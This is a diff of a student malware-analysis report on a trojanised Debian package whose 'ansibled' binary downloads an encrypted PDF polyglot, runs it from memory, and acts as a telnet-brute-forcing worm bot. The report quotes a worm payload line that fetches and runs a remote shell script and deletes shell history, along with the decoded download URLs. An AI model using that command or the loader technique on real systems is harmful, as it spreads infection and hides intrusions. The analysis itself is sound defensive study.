@@ -1,60 +1,75 @@
-# Project N2
-# Definition
+# Project 2
+# Introduction
 It was proposed to us to try to analyze a suspicious code that was found on campus using Reverse engineering techniques that were taught throughout the semester. \
-We need to find a response to the following questions:\
-- **Do we really have malware?**\
-- **How does the malware work and why a deb is used?**\
-- **Are other hosts involved?**\
-- **What is the potential impact on our organization?**\
+We need to find a response to the following questions:
+- **Do we really have malware?**
+- **How does the malware work and why a deb is used?**
+- **Are other hosts involved?**
+- **What is the potential impact on our organization?**
 
 # Strategy
 
+The strategy used in this project was to first understand the overall structure of the file. To do this we used the official deb file to compare to the one given by the professor and try to find any suspicious behaviour such as files and libraries. Only after finding more precise understanding of the file structure and what could be the problem on the deb file that we started using ghidra to staticly uncover the potential malware.
+
+# Analysis
+## Deb File
 First of all, we started with a simple search of what is a deb and what are their components. This is the relevant information that we found:
-- Deb is the file format that Debian uses in its distributions
-- This archive has 3 files: Debian-binary (Containing package format number), control archive (containing package name, version, dependencies, and maintainer), and data archive(Containing the installable files)
+- Deb is the file format that Debian uses in its distributions o install, update, and remove software packages on Linux computers.
+- This archive has 3 files: 
+    + Debian-binary (Containing package format number)
+    + Control archive (containing package name, versiondependencies, and maintainer)
+    + Data archive(Containing the installable files)
 
 ## Integrity check 
-As we checked there were too many files a shell script was made (with the help of stack overflow) to check the md5 of entire folders so we could compare them with a  genuine version
+As we expected there were more files than needed. A shell script was created (with the help of stack overflow) to check the md5 of entire folders so we could compare them with the official version.
 
-## Control
-Control is a file that contains the dependencies needed, seeing that the md5 didn't match the original one  we checked this file which contained two added dependencies:
-- libcurl4-openssl-dev 
-- curl
-![S](img/image.png)
+### Control
+Control is a file that contains the dependencies needed. seeing that the md5 didn't match the original one  we checked this file which contained two added dependencies **libcurl4-openssl-dev and curl** as we can see on the image below.
 
-This may suggest that the malware needs to communicate with an external server to **extravagate information** or **download extra code** from one.
+![](img/image.png)
 
-## Data
-The false deb has an extra lib folder that is suspicious, besides that, the user folder has a folder where the hashes don't match with the original one.
+This dependencies suggest that the malware needs to communicate with an external server to **extravagate information** or **download extra code** from one.
+
+### Data
+The unofficial deb has an extra lib folder that is suspicious since it isn't present on the official. \
+![](img/imagea.png)
+
+Besides that, the user folder has a folder where the hashes don't match with the original one, which is the `usr/bin` and after checking its contents we can see that the folder has an extra file named **ansibled**.
+
 ![](img/image-1.png)
-That folder has an extra file named **ansibled**
-
+![](img/image-3.png)
 
 ### Ansibled
-#### Strings
-Running the strings command can  give us some useful information, like this:
+Finnaly we ran the command strings which can  give us some quick and useful information of what the file is doing.\
+Just like what is shown below.
 
 ![alt text](img/image-2.png)
 
-We can see this file is trying to connect to some socket and using the extra libraries mentioned before
-####  File analysis with ghidra
-This file flow is based on signal handlers and structures. The structure "DAT_00104190" is considered as a variable and its value will determine if the code will curl or will execute the pdf, as it is in an infinite cycle of sleeps until it detects the pdf and then runs the ReadFile functions.  The first part of the code where a file ansibled.lock is deleted was the only one we couldn't find a reason to.
-##### Encrypt
-A function started at `0x001016da` that XOR's a second argument with the third and stores the result in the first.
-![alt text](img/encript.png)
-#### Threads
-The main function executes a thread that is always listening and waits for a connection to be made to a port reads it and saves it on a variable.
-#### Singal handler
-On memory address `00101b37`is a function that will be the handler of a signal.
-![Signal handler](img/SignalHandler.png)
-This function points to two others
-##### FUN_00101758
-At `00101758` this function decodes two strings
--  From `"m6/2m%7+&\'l2&$` to `/tmp/guide.pdf`
--  From `*662xmms{plstzlstrlsvqm%7+&\'l2&$` to `http://192.168.160.143/guid?e.pdf`
+We can see this file is trying to connect to some socket and using the extra libraries mentioned before, we can also see that the file is probably trying to manipulate the processes(**/proc/%d/fd/%d**) on the system and trying to create files on ram(**memfd_create**).
 
-Next the code 
-```
+## File analysis with ghidra
+
+This file flow is based on signal handlers and structures. The structure "DAT_00104190" is considered as a variable and its value will determine if the code will curl or will execute the pdf, as it is in an infinite cycle of sleeps until it detects the pdf and then runs the ReadFile functions.  The first part of the code where a file ansibled.lock is deleted was the only one we couldn't find a reason to.
+### Encrypt
+A function started at `0x001016da` that XOR's a second argument with the third and stores the result in the first.
+
+![alt text](img/encript.png)
+### Threads
+The main function executes a thread that is always listening and waits for a connection to be made to a port reads it and saves it on a variable.
+### Singal handler
+On memory address `00101b37`is a function that will be the handler of a signal.
+
+![Signal handler](img/SignalHandler.png)
+
+This function points to two others FUN_00101758 and FUN_00101a07.
+
+#### FUN_00101758
+At `00101758` the function decodes two strings:
+-  From `"m6/2m%7+&\'l2&$` to `/tmp/guide.pdf`
+-  From `*662xmms{plstzlstrlsvqm%7+&\'l2&$` to `http://192.168.160.143/guide.pdf`
+
+After decoding the strings it runs the following code.
+```c
   local_10 = curl_easy_init();
   if (local_10 != 0) {
     local_18 = fopen(local_a8,"wb");
@@ -72,32 +87,44 @@ Next the code
     fclose(local_18);
   }
 ```
-after searching for a bit we've found this example that very looks like the code above in "https://curl.se/libcurl/c/curl_easy_init.html"
+
+After a quick search we've found this example at [curl](https://curl.se/libcurl/c/curl_easy_init.html) that looks like the code shown above.
+
 ![](img/ExampleCurl.png)
-With the all evidence above we can see that this code is doing curl of a PDF file. 
-We curled the pdf to see what it was and got a "500 comandos de Linux explicados".  We thought it could be a Polyglot so we checked the hash with a similar one we found online.
-- Online:
-![alt text](img/Hash1.png)
-- What we Curled:
-![alt text](img/Hash2.png)
-It didn't match
 
-- Online size:   1527251
--  We curled size:  1592968
+With the all evidence above we can see that this code is doing curl of a PDF file. \
+We curled the url of the pdf to see what it was and got the pdf **"500 comandos de Linux explicados"**. 
+Initially, we considered the possibility that it might be a **Polyglot**. To investigate we started checking the hash and size of the one curled and with a similar pdf available online. \
+Upon the comparison shown below, we concluded they didn't match. The size disparity also suggests that the pdf contains extra information, suporting our speculation that it is a **polyglot**.
 
-##### FUN_00101a07 ->ReadFile
-This is the second function of the handler and will help us tell what is done with the file.
-##### FUN_001019b4-> File decription
-Give a pointer, a size, and a byte, it XOR's byte a byte the byte, and the next byte in the pointer
+- Online size: 1527251
+
+    ![alt text](img/Hash1.png)
+
+- Curled size: 1592968
+
+    ![alt text](img/Hash2.png)
+
+
+#### FUN_00101a07 -> ReadFile
+This is the second function of the handler, it is ran after the pdf is donwloaded and it's crucial for understanding the pdf's operations. It starts by decrypting the PDF and proceeds to execute the decrypted code contained within the PDF.
+
+#### FUN_001019b4 -> File decription
+This function serves the purpose of decrypting the PDF file to reveal the contents of the malicious code. It takes a pointer, a size, and a byte as inputs. \
+The function then XORs byte by byte with the specified input byte.
+
 ![alt text](img/Filedecription.png)
-##### FUN_00101870->RunSecretCode
-This code works right after the File description function, after the pdf gets decrypted this function copies the pdf to RAM with the name found on "0x64656c6269736e61". Then it loads the pdf as a library and looks for the symbol contained on "&DAT_001020d3" that is "RUN". After knowing the address of that symbol it sends the code to run from there.
+
+#### FUN_00101870 -> RunSecretCode
+This code works right after the pdf gets decrypted it copies the pdf to **RAM** with the name found on "0x64656c6269736e61". Then it loads the pdf as a library and looks for the symbol contained on "&DAT_001020d3" that is "RUN". After knowing the address of that symbol it sends the code to run from there.
+
 ![alt text](/img/RunSecret.png)
+
 ## PDF analysis
-A code to XOR all the PDF was made. The first function to execute would be the "run" one.
+We created a function to decrypt the PDF. Following this, this we opened ghidra for analysis, has was mentioned the initial function executed is the Run function, so we started our analysis from there.
 
 ### Run
-"Run" is the first function called in the PDF, it starts creating called "ansibled.lock" in /tmp, this file was eliminated in the "ansibled" file, leading us to believe that it is not crash in case this malware is run several times. 
+This function starts creating a file called "ansibled.lock" in /tmp, this file was eliminated in the "ansibled" file, leading us to believe that it is not crash in case this malware is run several times. 
 
 ### Proc
 #### Change Permissions
@@ -115,7 +142,6 @@ This function tries to connect to the IP and port specified in a given timeframe
 It starts getting the file status flags 
 
 #### getEndianness
-
 This function always returns "Little".
 
 #### getBuild
@@ -130,48 +156,41 @@ Recebe mensagens no socket byte a byte e guarda no buffer,  retorna o tamano do
 
 
 #### ProcessCmd
- This Function receives as 1st parameter the length of the cmd and the second parameter is the actual cmd.
- + TELNET
-   + ON
-     This is creating a process to do a Telnet Scanner.
-   + OFF
-     Killing the Telnet Scanner
-   + LOAD
-     Loading a scanner created it gives 
-+ PING
-   returns as soon as it enters the if.
+ This Function receives as 1st parameter the length of the cmd and the second parameter is the actual cmd then it uses if clauses to determine what to execute. It is important to notice that in the end of some commands the attacker executes `ClearHistory` to clear all the commands done previosly trying to hide its actions.
++  TELNET
+    + ON - This is creating a process to do a **Telnet Scanner**.
+    + OFF - Killing the Telnet Scanner.
+    + LOAD - Loading a scanner created it gives.
++ PING - returns as soon as it enters the if.
 + PY
-  + INSTALL
-     This is installing a tool called python-paramiko which is an implementation of ssh2 to connect remotely to devices. It also downloaded the file `scan.py` from ``http://192.168.160.143/scan.py``We tried to see the contents of the file but we weren't able to.
-     ![alt text](/img/scan.png)
-  + UPDATING
-     Removes the file scan.py from the device.
-  + LOAD
-     Loads and runs the scan.py with extra parameters just like a random number.
-  Important to notice that in the end Do'ClearHistory ``clears all the commands done trying to hide its actions.
-+ HTTP/UDP/TCP/STD
-   Send an HTTP/UDP/TCP/STD request with certain parameters that we are unable to discover without dynamic analysis.
-+ KILL
-   This kills all processes created
-+ UPDATE
-   Destroys Temporary files like logs and history.
+    + INSTALL - This is installing a tool called python-paramiko which is an implementation of ssh2 to connect remotely to devices. It also downloaded the file `scan.py` from ``http://192.168.160.143/scan.py``We tried to see the contents of the file but we weren't able to.
+    
+    ![alt text](/img/scan.png)
+    + UPDATING - Removes the file scan.py from the device.
+    + LOAD - Loads and runs the scan.py with extra parameters just like a random number.
++ HTTP/UDP/TCP/STD - Send an HTTP/UDP/TCP/STD request with certain parameters that we are unable to discover without dynamic analysis.
++ KILL - This kills all processes created.
++ UPDATE - Destroys Temporary files like logs and history.
 
 #### Telnet Scanner
 We are uncertain of what this telnet Scanner is, the code is too dense, and many arithmetic operations are done to maintain context and perceive what is done. Although we made some assumptions with some pieces of code, strings, functions, and messages as well as the whole context of the malware.
 - This is a scanner for open Telnet ports in the network, it scans the network for Telnet and then tries to brute force them.  
 - When it's successful it sends to the attacker's server the information (IP, port, username, and password)
-- Then it sends the following payload to the connected machines "cd /tmp;busybox curl 192.168.160.143/a.sh; chmod 777; sh a.sh;rm -rf ~/.bash_history" 
-We tried to curl the a.sh but we just got this: \
-![alt text](img/ash.png)
-\
-So it was concluded that is once again the initial script in ansibled or something similar, concluding that this is some kind of worm.
+- Then it sends the following payload to the connected machines `cd /tmp;busybox curl 192.168.160.143/a.sh; chmod 777; sh a.sh;rm -rf ~/.bash_history `.\
 
-##### How it works
+We tried to curl the `a.sh` to understand it but we just got the following error.
+
+![alt text](img/ash.png)
+
+In summary we believe that the Tenete scanner is likely running a worm aimed at infecting machines with open telnet ports across the network to which the user's system is connected.
+
+### How it works
 
 The `proc` function initiates by gathering essential system settings before executing the malicious code, utilizing previously defined functions. It manages the execution flow by first waiting for all child processes to terminate and subsequently freeing the associated memory. This memory cleanup continues until it stops receiving the 'PING' command. 
 After if the next command encountered is a 'DUP' command, the program stops with `exit(0)`.
 
-The subsequent segment of the function focuses on responding to received commands using the `processCmd` function. Before processing, the function meticulously parses the received command, eliminating unnecessary spaces, removing '\\n', and converting tokens to uppercase. These refined tokens are then organized into an array and passed to `processCmd` for further handling.
+The subsequent segment of the function focuses on responding to received commands using the `processCmd` function. Before processing, the function meticulously parses the received command, eliminating unnecessary spaces, removing `\n`, and converting tokens to uppercase. These tokens are then organized into an array and passed to `processCmd` for further handling.
+
 # Conclusions
 
 
